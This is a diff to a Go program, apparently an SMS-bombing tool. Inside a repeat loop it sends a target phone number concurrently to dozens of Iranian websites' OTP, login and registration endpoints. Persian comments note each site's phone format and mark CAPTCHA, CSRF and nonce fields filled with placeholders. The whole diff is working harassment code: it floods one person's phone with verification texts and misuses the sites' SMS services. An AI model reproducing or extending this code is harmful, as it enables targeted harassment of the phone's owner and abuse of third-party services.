@@ -344,28 +344,555 @@ cookieJar, _ := cookiejar.New(nil)
 	}
 
 	for i := 0; i < repeatCount; i++ {
-// techsiro.com (SMS - POST Form)
+// alibaba.ir (OTP - POST JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
 			return func() {
-				formData := url.Values{}
-				formData.Set("client", "web")
-				formData.Set("method", "POST")
-				formData.Set("_token", "")
-				formData.Set("mobile", phone)
-				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) // ارسال c
+				payload := map[string]interface{}{
+					"phoneNumber": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
 
-		// shimashoes.com (Registration - POST Form)
+		// football360.ir verify-phone (Check - POST JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
+				}
+				sendJSONRequest(c, ctx, "https://football360.ir/api/auth/v2/verify-phone/", payload, &wg, ch)
+			}
+		}(client)
+
+		// football360.ir send_otp (OTP - POST JSON)
+		// توجه: این نقطه پایانی نیاز به "otp_token" دارد که احتمالا از "verify-phone" یا مرحله قبل دریافت می شود و در یک حلقه ساده کار نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
+					"otp_token": "PLACEHOLDER_OTP_TOKEN", // نیاز به توکن پویا
+					"auto_read_platform": "ST", // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://football360.ir/api/auth/v2/send_otp/", payload, &wg, ch)
+			}
+		}(client)
+
+
+		// pubg-sell.ir (Login/OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("email", phone)
-				sendFormRequest(c, ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) // ارسال c
+				formData.Set("username", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://pubg-sell.ir/loginuser", formData, &wg, ch)
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client)
+
+		// pirankalaco.ir (OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("phone", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// api.vandar.io (Check/OTP - POST JSON)
+		// توجه: این نقطه پایانی نیاز به "captcha" دارد که بدون حل کپچا کار نخواهد کرد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+					"captcha": "PLACEHOLDER_CAPTCHA_RESPONSE", // نیاز به حل کپچا
+					"captcha_provider": "CLOUDFLARE", // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://api.vandar.io/account/v1/check/mobile", payload, &wg, ch)
+			}
+		}(client)
+
+		// dolichi.com (Login/Register - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("back", "my-account")
+				formData.Set("username", phone) // فرمت 09...
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("id_customer", "") // مقدار پیش فرض
+				formData.Set("firstname", "نام") // مقدار نمونه
+				formData.Set("lastname", "خانوادگی") // مقدار نمونه
+				formData.Set("email", "example@example.com") // مقدار نمونه
+				formData.Set("password", "1234567890") // مقدار نمونه
+				formData.Set("action", "register") // مقدار ثابت
+				formData.Set("ajax", "1") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://www.dolichi.com/login?back=my-account", formData, &wg, ch)
+			}
+		}(client)
+
+		// safarmarket.com is_phone_available (Check - GET Query)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				// پارامتر phone مستقیماً در URL قرار می گیرد
+				urlWithQuery := fmt.Sprintf("https://safarmarket.com//api/security/v1/user/is_phone_available?phone=%s", url.QueryEscape(phone))
+				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
+			}
+		}(client)
+
+		// safarmarket.com otp (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://safarmarket.com//api/security/v2/user/otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// app.inchand.com initialize (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://app.inchand.com/api/v1/authentication/initialize", payload, &wg, ch)
+			}
+		}(client)
+
+		// bikoplus.com check-phone-number (Check - GET Query)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				// پارامتر phoneNumber مستقیماً در URL قرار می گیرد
+				urlWithQuery := fmt.Sprintf("https://bikoplus.com/api/client/v3/authentications/check-phone-number?phoneNumber=%s", url.QueryEscape(phone))
+				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
+			}
+		}(client)
+
+		// titomarket.com send_code (OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") // مقدار ثابت
+				formData.Set("emailsend", "0") // مقدار ثابت
+				formData.Set("telephone", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
+			}
+		}(client)
+
+		// adinehbook.com sign-in (Login/OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("path", "") // مقدار پیش فرض
+				formData.Set("action", "sign") // مقدار ثابت
+				formData.Set("phone_cell_or_email", phone) // فرمت 09...
+				formData.Set("login-submit", "تایید") // مقدار ثابت (ممکن است نیاز نباشد)
+				sendFormRequest(c, ctx, "https://www.adinehbook.com/gp/flex/sign-in.html", formData, &wg, ch)
+			}
+		}(client)
+
+		// maxbax.com send_code (OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "bakala_send_code") // مقدار ثابت
+				formData.Set("phone_email", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://maxbax.com/bakala/ajax/send_code/", formData, &wg, ch)
+			}
+		}(client)
+
+		// nalinoco.com login-register (OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("step", "1") // مقدار ثابت
+				formData.Set("ReturnUrl", "/") // مقدار ثابت
+				formData.Set("mobile", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://www.nalinoco.com/api/customers/login-register", formData, &wg, ch)
+			}
+		}(client)
+
+		// narsisbeauty.com admin-ajax.php (OTP - POST Form)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("phone_number", phone) // فرمت 09...
+				formData.Set("wupp_remember_me", "on") // مقدار ثابت
+				formData.Set("action", "wupp_sign_up") // مقدار ثابت
+				// فیلدهای دیگر Digits که ممکن است لازم باشند:
+				// formData.Set("countrycode", "+98")
+				// formData.Set("digits", "1")
+				// formData.Set("instance_id", "...") // ممکن است پویا باشد
+				// ...
+				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// kapanigold.com admin-ajax.php (OTP - POST Form)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: csrf و dig_nounce ممکن است پویا باشند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob") // مقدار ثابت
+				formData.Set("countrycode", "+98") // مقدار ثابت
+				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("csrf", "PLACEHOLDER_CSRF") // نیاز به مقدار پویا
+				formData.Set("login", "1") // مقدار ثابت
+				formData.Set("username", "") // مقدار پیش فرض
+				formData.Set("email", "") // مقدار پیش فرض
+				formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("captcha_ses", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("json", "1") // مقدار ثابت
+				formData.Set("whatsapp", "0") // مقدار ثابت
+				formData.Set("mobmail", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("dig_otp", "") // مقدار پیش فرض
+				formData.Set("dig_nounce", "PLACEHOLDER_DIG_NOUNCE") // نیاز به مقدار پویا
+				sendFormRequest(c, ctx, "https://kapanigold.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// skmei-iran.com register (Registration/OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("email", phone) // از شماره تلفن به جای ایمیل استفاده شده
+				sendFormRequest(c, ctx, "https://skmei-iran.com/api/customer/member/register/", formData, &wg, ch)
+			}
+		}(client)
+
+		// api.123kif.com Register (Registration/OTP - POST JSON)
+		// توجه: نیاز به فیلدهای ثبت نام اضافه دارد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+					"password": "testpassword123", // مقدار نمونه
+					"firstName": "Test", // مقدار نمونه
+					"lastName": "User", // مقدار نمونه
+					"platform": "web", // مقدار ثابت
+					"refferCode": "", // مقدار پیش فرض
+				}
+				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
+			}
+		}(client)
+
+		// lavinbg.com admin-ajax.php (Login/OTP - POST Form)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
+		// این نقطه پایانی به نظر بخشی از فرآیند ورود/ثبت نام است و ممکن است به تنهایی OTP ارسال نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
+				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("digits_email", "") // مقدار پیش فرض
+				formData.Set("action_type", "phone") // مقدار ثابت
+				formData.Set("rememberme", "1") // مقدار ثابت
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا
+				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
+				formData.Set("type", "login") // مقدار ثابت (توجه: نوع login است نه register)
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//lavinbg.com/?page=2&redirect_to=https%3A%2F%2Flavinbg.com%2F") // مقدار ثابت
+				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا
+				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
+				formData.Set("show_force_title", "1") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://lavinbg.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// mofidteb.com auth (Login/OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"username": phone, // فرمت 09...
+					"terms_accepted": true, // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://mofidteb.com/api/auth/auth", payload, &wg, ch)
+			}
+		}(client)
+
+		// webpoosh.com register (Registration/OTP - POST Form)
+		// توجه: _token ممکن است پویا باشد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("_token", "PLACEHOLDER_TOKEN") // نیاز به مقدار پویا
+				formData.Set("cellphone", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://www.webpoosh.com/register", formData, &wg, ch)
+			}
+		}(client)
+
+		// hoomangold.com panel (Login/OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("endp", "step-2") // مقدار ثابت
+				formData.Set("redirect_to", "") // مقدار پیش فرض
+				formData.Set("action", "nirweb_panel_login_form") // مقدار ثابت
+				formData.Set("nirweb_panel_username", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://hoomangold.com/panel/?endp=step-2", formData, &wg, ch)
+			}
+		}(client)
+
+		// masterkala.com otp (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"type": "sendotp", // مقدار ثابت
+					"phone": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// sensishopping.com admin-ajax.php (OTP - POST Form)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: csrf, instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob") // مقدار ثابت
+				formData.Set("countrycode", "+98") // مقدار ثابت
+				// این نمونه از یک فاصله در شماره تلفن استفاده کرده بود، اما بهتر است از شماره تمیز استفاده شود
+				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("csrf", "PLACEHOLDER_CSRF") // نیاز به مقدار پویا
+				formData.Set("login", "1") // مقدار ثابت
+				formData.Set("username", "") // مقدار پیش فرض
+				formData.Set("email", "") // مقدار پیش فرض
+				formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("captcha_ses", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("json", "1") // مقدار ثابت
+				formData.Set("whatsapp", "0") // مقدار ثابت
+				formData.Set("mobmail", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("dig_otp", "") // مقدار پیش فرض
+				formData.Set("dig_nounce", "PLACEHOLDER_DIG_NOUNCE") // نیاز به مقدار پویا
+				sendFormRequest(c, ctx, "https://sensishopping.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+
+		// davidjonesonline.ir login_request (Login/OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile_phone": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://davidjonesonline.ir/api/v1/sessions/login_request", payload, &wg, ch)
+			}
+		}(client)
+
+		// gruccia.ir login (Login/Register - POST Form)
+		// مشابه dolichi.com
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("back", "my-account")
+				formData.Set("username", phone) // فرمت 09...
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("id_customer", "") // مقدار پیش فرض
+				formData.Set("firstname", "نام") // مقدار نمونه
+				formData.Set("lastname", "خانوادگی") // مقدار نمونه
+				// نمونه ایمیل و پسورد در این یکی نبود، اما برای register احتمالا لازم است
+				// formData.Set("email", "example@example.com")
+				// formData.Set("password", "1234567890")
+				formData.Set("action", "register") // مقدار ثابت
+				formData.Set("ajax", "1") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://gruccia.ir/login?back=my-account", formData, &wg, ch)
+			}
+		}(client)
+
+		// vitrin.shop request_code (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": phone, // فرمت 09...
+					"forgot_password": false, // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
+			}
+		}(client)
+
+		// mobilexpress.ir admin-ajax.php (POST Form - Step 1 Login check)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
+		// این نقطه پایانی به نظر بخشی از فرآیند ورود/ثبت نام است و ممکن است به تنهایی OTP ارسال نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
+				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("action_type", "phone") // مقدار ثابت
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا
+				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
+				formData.Set("type", "login") // مقدار ثابت
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//mobilexpress.ir/") // مقدار ثابت
+				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا
+				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
+				formData.Set("show_force_title", "1") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://mobilexpress.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// mobilexpress.ir admin-ajax.php (POST Form - Step 2 Register/Send OTP)
+		// این نقطه پایانی به نظر مرحله دوم ثبت نام یا ارسال OTP است.
+		// نیاز به فیلدهای مشابه مرحله 1 و احتمالا توکن ها یا کوکی های آن مرحله دارد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
+				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("action_type", "phone") // مقدار ثابت
+				formData.Set("digits_reg_name", "testname") // مقدار نمونه
+				formData.Set("digits_process_register", "1") // مقدار ثابت
+				formData.Set("sms_otp", "") // مقدار پیش فرض
+				formData.Set("digits_otp_field", "1") // مقدار ثابت
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا (احتمالا همان مرحله 1)
+				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
+				formData.Set("type", "login") // مقدار ثابت (هنوز نوع login است)
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//mobilexpress.ir/") // مقدار ثابت
+				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا (احتمالا همان مرحله 1)
+				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
+				formData.Set("show_force_title", "1") // مقدار ثابت
+				formData.Set("container", "digits_protected") // مقدار ثابت
+				formData.Set("sub_action", "sms_otp") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://mobilexpress.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+
+		// gateway.joordaroo.com request-otp (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://gateway.joordaroo.com/lgc/v1/auth/request-otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// api.beroozmart.com check-user (Check - POST JSON)
+		// این نقطه پایانی به نظر مرحله چک کردن وجود کاربر است و ممکن است به تنهایی OTP ارسال نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"username": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
+				}
+				sendJSONRequest(c, ctx, "https://api.beroozmart.com/api/pub/account/check-user", payload, &wg, ch)
+			}
+		}(client)
+
+		// api.beroozmart.com send-otp (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+					"sendViaSms": true, // مقدار ثابت
+					"email": nil, // مقدار ثابت
+					"sendViaEmail": false, // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://api.beroozmart.com/api/pub/account/send-otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// 2nabsh.com checkUsername (Check - POST Form)
+		// توجه: _token ممکن است پویا باشد. این نقطه پایانی به نظر مرحله چک کردن نام کاربری است.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("username", phone) // فرمت 09...
+				formData.Set("just_verify_mobile", "false") // مقدار ثابت
+				formData.Set("_token", "PLACEHOLDER_TOKEN") // نیاز به مقدار پویا
+				sendFormRequest(c, ctx, "https://www.2nabsh.com/auth/checkUsername", formData, &wg, ch)
+			}
+		}(client)
+
+		// api.sibche.com sendCode (OTP - POST JSON)
+		// توجه: نیاز به "g-recaptcha-response" دارد که بدون حل کپچا کار نخواهد کرد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+					"spec-g": nil, // مقدار ثابت
+					"g-recaptcha-response": "PLACEHOLDER_RECAPTCHA_RESPONSE", // نیاز به حل کپچا
+				}
+				sendJSONRequest(c, ctx, "https://api.sibche.com/profile/sendCode", payload, &wg, ch)
+			}
+		}(client)
+
+		// bimebazar.com login_sec (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"username": phone, // فرمت 09...
+					"type": "sms", // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://bimebazar.com/accounts/api/login_sec/", payload, &wg, ch)
+			}
+		}(client)
 
 
                     }
